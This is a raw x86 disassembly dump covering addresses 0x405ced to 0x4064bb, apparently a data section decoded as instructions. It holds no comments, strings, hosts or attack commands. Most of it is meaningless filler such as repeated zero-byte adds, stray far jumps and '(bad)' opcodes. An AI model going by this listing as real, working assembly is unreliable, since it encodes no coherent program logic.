  405ced:	sub    dh,BYTE PTR [eax+eax*1]
  405cf0:	dec    esp
  405cf1:	sub    al,0x0
  405cf3:	add    BYTE PTR [eax],al
  405cf5:	add    BYTE PTR [ecx+0x30b2200],dl
  405cfb:	sub    esi,DWORD PTR ds:0x2f9c00
  405d01:	add    BYTE PTR [eax],al
  405d03:	add    BYTE PTR [ecx+0xc0b4800],dl
  405d09:	sub    edi,DWORD PTR [ecx]
  405d0b:	add    BYTE PTR [eax+esi*1],dl
  405d0e:	add    BYTE PTR [eax],al
  405d10:	add    BYTE PTR [eax],al
  405d12:	xchg   ecx,eax
  405d13:	add    BYTE PTR [eax+0xb],ch
  405d16:	adc    al,0x2b
  405d18:	cmp    eax,DWORD PTR [eax]
  405d1a:	and    al,0x32
  405d1c:	add    BYTE PTR [eax],al
  405d1e:	add    BYTE PTR [eax],al
  405d20:	xchg   ecx,eax
  405d21:	add    BYTE PTR [ebp+0x3e2b1c0b],al
  405d27:	add    al,bl
  405d29:	xor    al,BYTE PTR [eax]
  405d2b:	add    BYTE PTR [eax],al
  405d2d:	add    BYTE PTR [ecx+0x220b8500],dl
  405d33:	sub    eax,DWORD PTR [eax+0x0]
  405d36:	xor    BYTE PTR [ebx],dh
  405d38:	add    BYTE PTR [eax],al
  405d3a:	add    BYTE PTR [eax],al
  405d3c:	xchg   ecx,eax
  405d3d:	add    BYTE PTR [ebx+0x422ac90b],ah
  405d43:	add    ah,al
  405d45:	add    BYTE PTR ss:[eax],al
  405d48:	add    BYTE PTR [eax],al
  405d4a:	xchg   ecx,eax
  405d4b:	add    BYTE PTR [ebp+0x432ac90b],dh
  405d51:	add    BYTE PTR [edi+esi*1],cl
  405d54:	add    BYTE PTR [eax],al
  405d56:	add    BYTE PTR [eax],al
  405d58:	xchg   ecx,eax
  405d59:	add    BYTE PTR [ebp+0x442b290b],dh
  405d5f:	add    BYTE PTR [edi+esi*1+0x0],bl
  405d66:	xchg   ecx,eax
  405d67:	add    ah,dl
  405d69:	or     ecx,ecx
  405d6b:	sub    al,BYTE PTR [ebp+0x0]
  405d6e:	les    edi,FWORD PTR [eax]
  405d70:	add    BYTE PTR [eax],al
  405d72:	add    BYTE PTR [eax],al
  405d74:	xchg   ecx,eax
  405d75:	add    BYTE PTR [eax+ecx*1],dh
  405d78:	das    
  405d79:	sub    eax,DWORD PTR [esi+0x0]
  405d7c:	test   BYTE PTR [ecx],bh
  405d7e:	add    BYTE PTR [eax],al
  405d80:	add    BYTE PTR [eax],al
  405d82:	xchg   BYTE PTR [eax],bl
  405d84:	je     0x405d8c
  405d86:	xor    al,0x27
  405d88:	inc    esi
  405d89:	add    BYTE PTR [ebp+0x39],bl
  405d8c:	add    BYTE PTR [eax],al
  405d8e:	add    BYTE PTR [eax],al
  405d90:	xchg   ecx,eax
  405d91:	sbb    BYTE PTR [ecx+edx*1+0x2f],al
  405d95:	sub    eax,DWORD PTR [esi+0x0]
  405d98:	mov    WORD PTR [ecx],?
  405d9a:	add    BYTE PTR [eax],al
  405d9c:	add    BYTE PTR [eax],al
  405d9e:	sbb    DWORD PTR [eax],0x74
  405da1:	push   es
  405da2:	xor    ebp,DWORD PTR [ebx]
  405da4:	inc    esi
  405da5:	add    BYTE PTR [ecx+0x39],bh
  405dab:	add    BYTE PTR [ebx+0x380c2608],al
  405db1:	and    ecx,DWORD PTR [ebx+0x0]
  405db4:	sar    DWORD PTR [ecx],0x0
  405db7:	add    BYTE PTR [eax],al
  405db9:	add    BYTE PTR [ebx+0x380c3308],al
  405dbf:	and    ecx,DWORD PTR [ebx+0x0]
  405dc2:	leave  
  405dc3:	cmp    DWORD PTR [eax],eax
  405dc5:	add    BYTE PTR [eax],al
  405dc7:	add    BYTE PTR [ebx+0x380c4108],al
  405dcd:	and    ecx,DWORD PTR [ebx+0x0]
  405dd0:	sar    DWORD PTR [ecx],1
  405dd2:	add    BYTE PTR [eax],al
  405dd4:	add    BYTE PTR [eax],al
  405dd6:	or     DWORD PTR [eax],0x4f
  405dd9:	or     al,0x38
  405ddb:	and    ecx,DWORD PTR [ebx+0x0]
  405dde:	fnstcw WORD PTR [ecx]
  405de0:	add    BYTE PTR [eax],al
  405de2:	add    BYTE PTR [eax],al
  405de4:	or     DWORD PTR [eax],0x62
  405de7:	or     al,0x3c
  405de9:	sub    ecx,DWORD PTR [ebx+0x0]
  405dec:	loope  0x405e27
  405dee:	add    BYTE PTR [eax],al
  405df0:	add    BYTE PTR [eax],al
  405df2:	or     DWORD PTR [eax],0x74
  405df5:	or     al,0x40
  405df7:	sub    ecx,DWORD PTR [ebx+0x0]
  405dfa:	jmp    0x8300:0x39
  405e01:	sbb    BYTE PTR [esi+eax*1+0x49],dh
  405e05:	sub    ecx,DWORD PTR [eax+eax*1+0x3]
  405e09:	cmp    al,BYTE PTR [eax]
  405e0b:	add    BYTE PTR [eax],al
  405e0d:	add    BYTE PTR [ebx+0x51067418],al
  405e13:	sub    ecx,DWORD PTR [edi+0x0]
  405e16:	sbb    al,0x3a
  405e18:	add    BYTE PTR [eax],al
  405e1a:	add    BYTE PTR [eax],al
  405e1c:	mov    BYTE PTR [eax],0xed
  405e1f:	or     al,0x57
  405e21:	sub    edx,DWORD PTR [eax+0x0]
  405e24:	pusha  
  405e25:	cmp    al,BYTE PTR [eax]
  405e27:	add    BYTE PTR [eax],al
  405e29:	add    dh,al
  405e2b:	add    ch,ch
  405e2d:	or     al,0x5b
  405e2f:	sub    edx,DWORD PTR [eax+0x0]
  405e32:	mov    ah,0x3a
  405e34:	add    BYTE PTR [eax],al
  405e36:	add    BYTE PTR [eax],al
  405e38:	mov    BYTE PTR [eax],0xf2
  405e3b:	or     al,0x38
  405e3d:	and    edx,DWORD PTR [ebx+0x0]
  405e40:	loope  0x405e7c
  405e42:	add    BYTE PTR [eax],al
  405e44:	add    BYTE PTR [eax],al
  405e46:	mov    BYTE PTR [eax],0xfb
  405e49:	or     al,0x38
  405e4b:	and    edx,DWORD PTR [ebx+0x0]
  405e4e:	in     eax,dx
  405e4f:	cmp    al,BYTE PTR [eax]
  405e51:	add    BYTE PTR [eax],al
  405e53:	add    BYTE PTR [ebx+0x570d0508],al
  405e59:	sub    edx,DWORD PTR [ebx+0x0]
  405e5c:	cmc    
  405e5d:	cmp    al,BYTE PTR [eax]
  405e5f:	add    BYTE PTR [eax],al
  405e61:	add    BYTE PTR [ebx+0x570d1408],al
  405e67:	sub    edx,DWORD PTR [ebx+0x0]
  405e6a:	std    
  405e6b:	cmp    al,BYTE PTR [eax]
  405e6d:	add    BYTE PTR [eax],al
  405e6f:	add    BYTE PTR [ebx+0x67067418],al
  405e75:	sub    edx,DWORD PTR [ebx+0x0]
  405e78:	sbb    al,0x3b
  405e7a:	add    BYTE PTR [eax],al
  405e7c:	add    BYTE PTR [eax],al
  405e7e:	or     DWORD PTR [eax],0x4f
  405e81:	or     eax,0x572338
  405e86:	and    al,0x3b
  405e88:	add    BYTE PTR [eax],al
  405e8a:	add    BYTE PTR [eax],al
  405e8c:	or     DWORD PTR [eax],0x5
  405e8f:	or     eax,0x572b57
  405e94:	sub    al,0x3b
  405e96:	add    BYTE PTR [eax],al
  405e98:	add    BYTE PTR [eax],al
  405e9a:	or     DWORD PTR [eax],0x14
  405e9d:	or     eax,0x572b57
  405ea2:	xor    al,0x3b
  405ea4:	add    BYTE PTR [eax],al
  405ea6:	add    BYTE PTR [eax],al
  405ea8:	xchg   BYTE PTR [eax],bl
  405eaa:	je     0x405eb2
  405eac:	sub    BYTE PTR [ebx],0x57
  405eaf:	add    BYTE PTR [eax],al
  405eb1:	add    BYTE PTR [ecx],al
  405eb3:	add    BYTE PTR [eax+0x100000d],cl
  405eb9:	add    BYTE PTR [ebx+0x100000d],cl
  405ebf:	add    BYTE PTR [edi+0x100000d],dl
  405ec5:	add    BYTE PTR [edx+0x100000d],al
  405ecb:	add    BYTE PTR [ebp+0xd],bh
  405ece:	add    BYTE PTR [eax],al
  405ed0:	add    al,BYTE PTR [eax]
  405ed2:	mov    al,ds:0x100000d
  405ed7:	add    BYTE PTR [ebp+0xd],bh
  405eda:	add    BYTE PTR [eax],al
  405edc:	add    DWORD PTR [eax],eax
  405ede:	jge    0x405eed
  405ee0:	add    BYTE PTR [eax],al
  405ee2:	add    DWORD PTR [eax],eax
  405ee4:	jge    0x405ef3
  405ee6:	add    BYTE PTR [eax],al
  405ee8:	add    al,BYTE PTR [eax]
  405eea:	or     BYTE PTR ds:0x30000,0xb9
  405ef1:	or     eax,0x40000
  405ef6:	(bad)  
  405ef7:	or     eax,0x50000
  405efc:	ror    BYTE PTR ds:0x10000,cl
  405f02:	jge    0x405f11
  405f04:	add    BYTE PTR [eax],al
  405f06:	add    al,BYTE PTR [eax]
  405f08:	or     BYTE PTR ds:0x30000,0xb9
  405f0f:	or     eax,0x10000
  405f14:	fisttp WORD PTR ds:0x10000
  405f1a:	fisttp WORD PTR ds:0x20000
  405f20:	out    0xd,eax
  405f22:	add    BYTE PTR [eax],al
  405f24:	add    DWORD PTR [eax],eax
  405f26:	fisttp WORD PTR ds:0x20000
  405f2c:	repz or eax,0x10000
  405f32:	fisttp WORD PTR ds:0x20000
  405f38:	repz or eax,0x30000
  405f3e:	out    0xd,eax
  405f40:	add    BYTE PTR [eax],al
  405f42:	add    DWORD PTR [eax],eax
  405f44:	fisttp WORD PTR ds:0x20000
  405f4a:	repz or eax,0x30000
  405f50:	cld    
  405f51:	or     eax,0x40000
  405f56:	add    DWORD PTR [esi],ecx
  405f58:	add    BYTE PTR [eax],al
  405f5a:	add    DWORD PTR [eax],eax
  405f5c:	fisttp WORD PTR ds:0x20000
  405f62:	repz or eax,0x30000
  405f68:	cld    
  405f69:	or     eax,0x40000
  405f6e:	add    DWORD PTR [esi],ecx
  405f70:	add    BYTE PTR [eax],al
  405f72:	add    eax,0xde700
  405f77:	add    BYTE PTR [ecx],al
  405f79:	add    bh,bl
  405f7b:	or     eax,0x10000
  405f80:	fisttp WORD PTR ds:0x20000
  405f86:	repz or eax,0x10000
  405f8c:	fisttp WORD PTR ds:0x20000
  405f92:	repz or eax,0x30000
  405f98:	or     BYTE PTR [esi],cl
  405f9a:	add    BYTE PTR [eax],al
  405f9c:	add    DWORD PTR [eax],eax
  405f9e:	fisttp WORD PTR ds:0x20000
  405fa4:	repz or eax,0x30000
  405faa:	cld    
  405fab:	or     eax,0x40000
  405fb0:	add    DWORD PTR [esi],ecx
  405fb2:	add    BYTE PTR [eax],al
  405fb4:	add    DWORD PTR [eax],eax
  405fb6:	fisttp WORD PTR ds:0x20000
  405fbc:	repz or eax,0x30000
  405fc2:	cld    
  405fc3:	or     eax,0x40000
  405fc8:	add    DWORD PTR [esi],ecx
  405fca:	add    BYTE PTR [eax],al
  405fcc:	add    eax,0xe0800
  405fd1:	add    BYTE PTR [ecx],al
  405fd3:	add    BYTE PTR [esi],dl
  405fd5:	push   cs
  405fd6:	add    BYTE PTR [eax],al
  405fd8:	add    DWORD PTR [eax],eax
  405fda:	mov    al,ds:0x100000d
  405fdf:	add    BYTE PTR [edi],bl
  405fe1:	push   cs
  405fe2:	add    BYTE PTR [eax],al
  405fe4:	add    DWORD PTR [eax],eax
  405fe6:	pop    ds
  405fe7:	push   cs
  405fe8:	add    BYTE PTR [eax],al
  405fea:	add    DWORD PTR [eax],eax
  405fec:	pop    ds
  405fed:	push   cs
  405fee:	add    BYTE PTR [eax],al
  405ff0:	add    al,BYTE PTR [eax]
  405ff2:	es push cs
  405ff4:	add    BYTE PTR [eax],al
  405ff6:	add    eax,DWORD PTR [eax]
  405ff8:	cs push cs
  405ffa:	add    BYTE PTR [eax],al
  405ffc:	add    al,0x0
  405ffe:	inc    ebx
  405fff:	push   cs
  406000:	add    BYTE PTR [eax],al
  406002:	add    DWORD PTR [eax],eax
  406004:	push   ecx
  406005:	push   cs
  406006:	add    BYTE PTR [eax],al
  406008:	add    al,BYTE PTR [eax]
  40600a:	mov    al,ds:0x100000d
  40600f:	add    BYTE PTR [esi],ah
  406011:	push   cs
  406012:	add    BYTE PTR [eax],al
  406014:	add    al,BYTE PTR [eax]
  406016:	pop    eax
  406017:	push   cs
  406018:	add    BYTE PTR [eax],al
  40601a:	add    eax,DWORD PTR [eax]
  40601c:	mov    ecx,0x100000d
  406021:	add    BYTE PTR [esi],dl
  406023:	push   cs
  406024:	add    BYTE PTR [eax],al
  406026:	add    al,BYTE PTR [eax]
  406028:	inc    ebx
  406029:	push   cs
  40602a:	add    BYTE PTR [eax],al
  40602c:	add    DWORD PTR [eax],eax
  40602e:	pusha  
  40602f:	push   cs
  406030:	add    BYTE PTR [eax],al
  406032:	add    al,BYTE PTR [eax]
  406034:	repz or eax,0x10000
  40603a:	repz or eax,0x10000
  406040:	push   ss
  406041:	push   cs
  406042:	add    BYTE PTR [eax],al
  406044:	add    DWORD PTR [eax],eax
  406046:	addr16 push cs
  406048:	add    BYTE PTR [eax],al
  40604a:	add    DWORD PTR [eax],eax
  40604c:	repz or eax,0x10000
  406052:	outs   dx,BYTE PTR ds:[esi]
  406053:	push   cs
  406054:	add    BYTE PTR [eax],al
  406056:	add    al,BYTE PTR [eax]
  406058:	ja     0x406068
  40605a:	add    BYTE PTR [eax],al
  40605c:	add    eax,DWORD PTR [eax]
  40605e:	or     DWORD PTR [esi],0x40000
  406064:	mov    ecx,DWORD PTR [esi]
  406066:	add    BYTE PTR [eax],al
  406068:	add    eax,0xe9a00
  40606d:	add    BYTE PTR [ecx],al
  40606f:	add    BYTE PTR [edx+0x100000d],al
  406075:	add    bl,dh
  406077:	or     eax,0x20000
  40607c:	stos   BYTE PTR es:[edi],al
  40607d:	push   cs
  40607e:	add    BYTE PTR [eax],al
  406080:	add    eax,DWORD PTR [eax]
  406082:	mov    bl,0xe
  406084:	add    BYTE PTR [eax],al
  406086:	add    DWORD PTR [eax],eax
  406088:	ret    0x30e
  40608b:	add    BYTE PTR [ecx],al
  40608d:	add    cl,cl
  40608f:	push   cs
  406090:	add    BYTE PTR [eax],al
  406092:	add    al,BYTE PTR [eax]
  406094:	pop    es
  406095:	sldt   WORD PTR [eax]
  406098:	add    eax,DWORD PTR [eax]
  40609a:	or     eax,0x100000f
  40609f:	add    bh,bl
  4060a1:	or     eax,0x20000
  4060a6:	repz or eax,0x30000
  4060ac:	(bad)  
  4060ad:	or     eax,0x40000
  4060b2:	ror    BYTE PTR ds:0x10000,cl
  4060b8:	jge    0x4060c7
  4060ba:	add    BYTE PTR [eax],al
  4060bc:	add    al,BYTE PTR [eax]
  4060be:	or     BYTE PTR ds:0x6740099,0x34
  4060c5:	daa    
  4060c6:	mov    eax,ds:0x34067400
  4060cb:	daa    
  4060cc:	test   eax,0x34067400
  4060d1:	daa    
  4060d2:	mov    cl,0x0
  4060d4:	je     0x4060dc
  4060d6:	inc    eax
  4060d7:	sub    edi,DWORD PTR [ecx+0x40067400]
  4060dd:	sub    eax,ecx
  4060df:	add    BYTE PTR [esi+eax*1+0x33],dh
  4060e3:	and    ecx,ecx
  4060e5:	add    BYTE PTR [esi+eax*1+0x33],dh
  4060e9:	and    edx,ecx
  4060eb:	add    BYTE PTR [esi+eax*1+0x33],dh
  4060ef:	and    ebx,ecx
  4060f1:	add    BYTE PTR [esi+eax*1+0x33],dh
  4060f5:	and    esp,ecx
  4060f7:	add    BYTE PTR [esi+eax*1+0x33],dh
  4060fb:	and    ebp,ecx
  4060fd:	add    BYTE PTR [esi+eax*1+0x33],dh
  406101:	and    esi,ecx
  406103:	add    BYTE PTR [esi+eax*1+0x33],dh
  406107:	and    edi,ecx
  406109:	add    BYTE PTR [esi+eax*1+0x33],dh
  40610d:	and    eax,DWORD PTR [ecx]
  40610f:	add    DWORD PTR [esi+eax*1+0x33],esi
  406113:	and    ecx,DWORD PTR [ecx]
  406115:	add    DWORD PTR [esi+eax*1+0x33],esi
  406119:	and    edx,DWORD PTR [ecx]
  40611b:	add    DWORD PTR [esi+eax*1+0x33],esi
  40611f:	and    ebx,DWORD PTR [ecx]
  406121:	add    DWORD PTR [esi+eax*1+0x40],esi
  406125:	sub    esp,DWORD PTR [ecx]
  406127:	add    DWORD PTR [esi+eax*1+0x33],esi
  40612b:	and    ebp,DWORD PTR [ecx]
  40612d:	add    DWORD PTR [esi+eax*1-0x75],esi
  406131:	sub    edi,DWORD PTR [ecx]
  406133:	add    DWORD PTR [esi+eax*1-0x6e],esi
  406137:	sub    eax,DWORD PTR [ecx+0x1]
  40613a:	je     0x406142
  40613c:	xor    al,0x27
  40613e:	cmp    DWORD PTR [eax],eax
  406140:	add    eax,DWORD PTR [esi]
  406142:	inc    eax
  406143:	and    ebp,DWORD PTR [ecx+0x0]
  406146:	dec    ebx
  406147:	adc    DWORD PTR [ecx],edi
  406149:	sub    al,0x39
  40614b:	add    BYTE PTR [esi+eax*1+0x3e],dh
  40614f:	sub    al,0x49
  406151:	add    DWORD PTR [esi+eax*1+0x45],esi
  406155:	sub    al,0x11
  406157:	add    BYTE PTR [esi+eax*1+0x33],dh
  40615b:	and    edx,DWORD PTR [ecx]
  40615d:	add    BYTE PTR [edx+0x6],bh
  406160:	cmp    BYTE PTR [ebx],ah
  406162:	adc    DWORD PTR [eax],eax
  406164:	mov    DWORD PTR [ecx],edx
  406166:	xor    esp,DWORD PTR [ebx]
  406168:	sbb    DWORD PTR [eax],eax
  40616a:	je     0x406172
  40616c:	xor    esp,DWORD PTR [ebx]
  40616e:	or     DWORD PTR [eax],eax
  406170:	je     0x406178
  406172:	xor    al,0x27
  406174:	or     DWORD PTR [eax],eax
  406176:	mov    ds:0x592c5511,eax
  40617b:	add    DWORD PTR [ebx+0x612c5b11],ebp
  406181:	add    ebp,edx
  406183:	adc    DWORD PTR [eax+0x2c],esp
  406186:	cmp    DWORD PTR [eax],eax
  406188:	add    eax,DWORD PTR [esi]
  40618a:	ja     0x4061b8
  40618c:	imul   eax,DWORD PTR [ecx],0x2b5711ec
  406192:	imul   eax,DWORD PTR [ecx],0x2c7e11f7
  406198:	imul   eax,DWORD PTR [ecx],0x2c841201
  40619e:	inc    ecx
  40619f:	add    BYTE PTR [eax],cl
  4061a1:	adc    bh,BYTE PTR ds:0xf5016927
  4061a7:	add    BYTE PTR [edx-0x6ffc6d4],cl
  4061ad:	or     BYTE PTR [esp+ebp*1+0x122b0051],bl
  4061b4:	mov    ds:0x3700492c,eax
  4061b9:	adc    ch,BYTE PTR [eax+0x3700512c]
  4061bf:	adc    ch,BYTE PTR [ebp+0x4e01792c]
  4061c5:	adc    bh,BYTE PTR [edx+0x5e01812c]
  4061cb:	adc    al,al
  4061cd:	sub    al,0x81
  4061cf:	add    DWORD PTR [esi+0x12],ebx
  4061d2:	retf   
  4061d3:	sub    al,0x81
  4061d5:	add    DWORD PTR [esi+0x12],ebx
  4061d8:	shr    DWORD PTR [ecx+eax*4],cl
  4061db:	add    DWORD PTR [esi+0x12],ebx
  4061de:	sub    BYTE PTR [ebx],0x91
  4061e1:	add    DWORD PTR [ebp+0x12],ebp
  4061e4:	and    esp,DWORD PTR [ebx]
  4061e6:	inc    ecx
  4061e7:	add    BYTE PTR [edx+0x12],bh
  4061ea:	cmp    eax,0x8f016927
  4061ef:	adc    ah,al
  4061f1:	sub    al,0x99
  4061f3:	add    DWORD PTR [ebx-0x66d316ee],esp
  4061f9:	add    DWORD PTR [eax+0x692ce912],ebp
  4061ff:	add    DWORD PTR [ebp+0x692cee12],esi
  406205:	add    DWORD PTR [edx+edx*1+0x1692cf3],edi
  40620c:	not    DWORD PTR [ecx]
  40620e:	clc    
  40620f:	sub    al,0x69
  406211:	add    esp,eax
  406213:	adc    bh,ch
  406215:	sub    al,0x69
  406217:	add    esi,ecx
  406219:	adc    ch,dh
  40621b:	sub    al,0x69
  40621d:	add    DWORD PTR [edx+edx*1+0xc2d02],edi
  406224:	je     0x40622c
  406226:	xor    al,0x27
  406228:	popa   
  406229:	add    cl,bl
  40622b:	adc    cl,BYTE PTR [edi]
  40622d:	sub    eax,0x1237000c
  406232:	adc    eax,0xa300292d
  406237:	adc    DWORD PTR [ebp+0x2c],edx
  40623a:	mov    eax,ds:0x3812f401
  40623f:	and    ebp,DWORD PTR [ecx]
  406241:	add    ch,bh
  406243:	adc    bh,BYTE PTR [eax]
  406245:	and    ebp,DWORD PTR [ecx+0x1]
  406248:	or     DWORD PTR [ebx],edx
  40624a:	sbb    ebp,DWORD PTR ds:0x125e0181
  406250:	xor    esp,DWORD PTR [ebx]
  406252:	test   eax,0xfe131601
  406257:	sub    ch,BYTE PTR [ecx-0x36ece2ff]
  40625d:	sub    ch,BYTE PTR [ecx+0x1]
  406260:	and    al,0x13
  406262:	pop    eax
  406263:	sub    eax,0x133c0041
  406268:	popa   
  406269:	sub    eax,0x135b01b1
  40626e:	addr16 sub eax,0x13640049
  406274:	xor    al,0x27
  406276:	push   ecx
  406277:	add    BYTE PTR [ebx+edx*1+0x34],ah
  40627b:	daa    
  40627c:	or     al,0x0
  40627e:	push   0x13
  406280:	push   edi
  406281:	sub    eax,ecx
  406283:	add    DWORD PTR [esi+0x13],edi
  406286:	jbe    0x4062b5
  406288:	leave  
  406289:	add    DWORD PTR [esi+eax*1+0x7c],esi
  40628d:	sub    eax,0x13a401c1
  406292:	sub    BYTE PTR ds:0x13b80029,0x89
  406299:	sub    eax,0xd0501d1
  40629e:	push   edi
  40629f:	sub    edx,ecx
  4062a1:	add    DWORD PTR [ecx*1+0x1d92b57],edx
  4062a8:	je     0x4062b0
  4062aa:	xchg   edx,eax
  4062ab:	sub    ebx,ecx
  4062ad:	add    ecx,esi
  4062af:	adc    ecx,DWORD PTR [esi-0x7fff6d3]
  4062b5:	adc    edi,DWORD PTR [eax]
  4062b7:	and    ecx,DWORD PTR [eax+eax*1]
  4062ba:	sub    dl,BYTE PTR [edi+edi*4]
  4062bd:	sub    eax,0x14380014
  4062c2:	shr    DWORD PTR ds:0x14440061,1
  4062c8:	cmp    BYTE PTR [ebx],ah
  4062ca:	jno    0x4062cc
  4062cc:	hlt    
  4062cd:	adc    bh,BYTE PTR [eax]
  4062cf:	and    ebp,DWORD PTR [ecx+0x1]
  4062d2:	mov    ch,0x12
  4062d4:	(bad)  
  4062d5:	sub    eax,0x14620061
  4062da:	cmp    BYTE PTR [ebx],ah
  4062dc:	imul   eax,DWORD PTR [eax],0x2ddf146f
  4062e2:	adc    al,0x0
  4062e4:	js     0x4062fa
  4062e6:	cmp    al,0x2b
  4062e8:	add    DWORD PTR [edx],eax
  4062ea:	lea    edx,[esp+esi*1]
  4062ed:	daa    
  4062ee:	or     DWORD PTR [edx],eax
  4062f0:	mov    ebp,0x912df314
  4062f5:	add    ecx,edx
  4062f7:	adc    al,0xfa
  4062f9:	sub    eax,0x14e50191
  4062fe:	cli    
  4062ff:	sub    eax,0x14fc0191
  406304:	cli    
  406305:	sub    eax,0x15160169
  40630a:	std    
  40630b:	sub    eax,0x15250209
  406310:	cmp    BYTE PTR [ebx],ah
  406312:	imul   eax,DWORD PTR [ecx],0x2e031201
  406318:	sbb    DWORD PTR [edx],eax
  40631a:	jns    0x406331
  40631c:	adc    ebp,DWORD PTR [esi]
  40631e:	imul   eax,DWORD PTR [ecx],0x2afe158c
  406324:	jns    0x406327
  406326:	call   0x9a01:0x792e1b15
  40632d:	adc    eax,0x1692e21
  406332:	add    DWORD PTR [edx],edx
  406334:	sub    BYTE PTR [esi],ch
  406336:	imul   eax,DWORD PTR [ecx],0x2e2f12b5
  40633c:	imul   eax,DWORD PTR [ecx],0x2e2f15a0
  406342:	jns    0x406345
  406344:	pop    esi
  406345:	adc    ch,BYTE PTR [edi]
  406347:	sub    ebx,DWORD PTR [ecx]
  406349:	add    dl,ah
  40634b:	adc    eax,0x2212e37
  406350:	or     edx,DWORD PTR [esi]
  406352:	dec    ecx
  406353:	xor    DWORD PTR cs:[edx],eax
  406356:	aaa    
  406357:	adc    dh,bl
  406359:	sub    al,0x39
  40635b:	add    dh,BYTE PTR [esi+eax*1+0x34]
  40635f:	daa    
  406360:	inc    ecx
  406361:	add    dh,BYTE PTR [esi+eax*1+0x4f]
  406365:	cs dec ecx
  406367:	add    dh,BYTE PTR [esi+eax*1+0x55]
  40636b:	or     DWORD PTR cs:[edx],eax
  40636e:	push   ebx
  40636f:	push   ss
  406370:	pop    ebp
  406371:	cs jns 0x406375
  406374:	pop    esi
  406375:	adc    cl,cl
  406377:	sub    cl,BYTE PTR [eax+eax*1]
  40637a:	outs   dx,DWORD PTR ds:[esi]
  40637b:	push   ss
  40637c:	nop
  40637d:	cs push ecx
  40637f:	add    dh,BYTE PTR [esi+eax*1-0x6a]
  406383:	cs push ecx
  406385:	add    dh,BYTE PTR [esi+eax*1+0x33]
  406389:	and    edx,DWORD PTR [ecx+0x23169f01]
  40638f:	and    edx,DWORD PTR [ecx+0x2316ab01]
  406395:	and    edx,DWORD PTR [ecx+0x2]
  406398:	mov    esp,0x59233316
  40639d:	add    dh,BYTE PTR [esi+eax*1+0x33]
  4063a1:	and    ecx,DWORD PTR [ecx+0x0]
  4063a4:	push   0x13
  4063a6:	push   edi
  4063a7:	sub    edi,DWORD PTR [ecx+0x0]
  4063aa:	sub    dl,BYTE PTR [ebx+ebp*4]
  4063ad:	cs popa 
  4063af:	add    ch,dh
  4063b1:	push   ss
  4063b2:	mov    cl,0x2e
  4063b4:	popa   
  4063b5:	add    dh,dh
  4063b7:	push   ss
  4063b8:	mov    cl,0x2e
  4063ba:	imul   eax,DWORD PTR [edx],0x2b3c1478
  4063c0:	inc    ecx
  4063c1:	add    dh,BYTE PTR [esi+eax*1+0x40]
  4063c5:	sub    esi,DWORD PTR [ecx+0x2]
  4063c8:	in     eax,dx
  4063c9:	or     al,0x57
  4063cb:	sub    esi,DWORD PTR [ecx+0x2]
  4063ce:	repnz or al,0x38
  4063d1:	and    ebx,ecx
  4063d3:	add    DWORD PTR [edi],edx
  4063d5:	pop    ss
  4063d6:	xchg   edx,eax
  4063d7:	sub    ebx,ecx
  4063d9:	add    esp,ebp
  4063db:	adc    DWORD PTR [edi+0x2b],edx
  4063de:	fld    DWORD PTR [ecx]
  4063e0:	icebp  
  4063e1:	adc    edi,DWORD PTR [edi-0x3bfe26d2]
  4063e7:	adc    bh,ch
  4063e9:	sub    al,0x71
  4063eb:	add    ch,ch
  4063ed:	or     al,0x5b
  4063ef:	sub    ebp,DWORD PTR [ecx+0x1]
  4063f2:	je     0x4063fa
  4063f4:	(bad)  
  4063f5:	cs jns 0x4063fa
  4063f8:	ss pop ss
  4063fa:	int3   
  4063fb:	mov    DWORD PTR cs:[edx],eax
  4063fe:	je     0x406406
  406400:	xor    esp,DWORD PTR [ebx]
  406402:	xchg   ecx,eax
  406403:	add    dh,BYTE PTR [esi+eax*1+0x33]
  406407:	and    ecx,DWORD PTR [ecx+0x0]
  40640a:	sub    dl,BYTE PTR [edx+edi*8]
  40640d:	imul   eax,DWORD PTR cs:[edx],0x2eb11438
  406414:	add    DWORD PTR [eax],0x2b820acf
  40641a:	jns    0x40641d
  40641c:	call   0x5e00:0x812ac915
  406423:	pop    ss
  406424:	xor    al,0x27
  406426:	mov    DWORD PTR [eax],eax
  406428:	fs pop ss
  40642a:	or     eax,0x4401592f
  40642f:	adc    al,0x38
  406431:	and    ebp,DWORD PTR [ecx+0x1]
  406434:	ins    DWORD PTR es:[edi],dx
  406435:	pop    ss
  406436:	adc    ch,BYTE PTR [edi]
  406438:	cdq    
  406439:	add    DWORD PTR [ebp+0x17],esi
  40643c:	sub    ebp,DWORD PTR [edi]
  40643e:	or     DWORD PTR [edx],eax
  406440:	mov    ss,WORD PTR [edi]
  406442:	xor    DWORD PTR [edi],ebp
  406444:	mov    eax,ds:0x3817a102
  406449:	das    
  40644a:	dec    ecx
  40644b:	add    BYTE PTR [esi+eax*1+0x34],dh
  40644f:	daa    
  406450:	test   eax,0x4a17bd02
  406455:	das    
  406456:	push   ecx
  406457:	add    BYTE PTR [esi+eax*1+0x50],dh
  40645b:	das    
  40645c:	and    DWORD PTR [eax],eax
  40645e:	je     0x406466
  406460:	dec    ecx
  406461:	sub    esp,DWORD PTR [ecx]
  406463:	add    BYTE PTR [esi+eax*1+0x51],dh
  406467:	sub    esp,DWORD PTR [ecx]
  406469:	add    ch,ch
  40646b:	or     al,0x57
  40646d:	sub    esp,DWORD PTR [ecx]
  40646f:	add    ch,ch
  406471:	or     al,0x5b
  406473:	sub    esp,DWORD PTR [ecx]
  406475:	add    dl,dh
  406477:	or     al,0x38
  406479:	and    edi,DWORD PTR [ecx+0x33067402]
  40647f:	and    ebp,DWORD PTR [ecx]
  406481:	add    BYTE PTR [esi+eax*1+0x33],dh
  406485:	and    ecx,DWORD PTR [esi]
  406487:	add    BYTE PTR [eax+eax*1],al
  40648a:	or     eax,0x8000e00
  40648f:	add    BYTE PTR [eax+eax*1],bl
  406492:	push   cs
  406493:	add    BYTE PTR [eax+eax*1],cl
  406496:	sbb    al,0x0
  406498:	push   cs
  406499:	add    BYTE PTR [eax],dl
  40649b:	add    BYTE PTR [ebx],ch
  40649d:	add    BYTE PTR [esi],cl
  40649f:	add    BYTE PTR [eax+eax*1],dl
  4064a2:	sub    eax,DWORD PTR [eax]
  4064a4:	push   cs
  4064a5:	add    BYTE PTR [eax],bl
  4064a7:	add    BYTE PTR [ebx],ch
  4064a9:	add    BYTE PTR [esi],cl
  4064ab:	add    BYTE PTR [eax+eax*1],bl
  4064ae:	inc    eax
  4064af:	add    BYTE PTR [esi],cl
  4064b1:	add    BYTE PTR [eax],ah
  4064b3:	add    BYTE PTR [eax+eax*1],bl
  4064b6:	push   cs
  4064b7:	add    BYTE PTR [eax+eax*1],ah
  4064ba:	popf   
  4064bb:	add    BYTE PTR [eax],cl
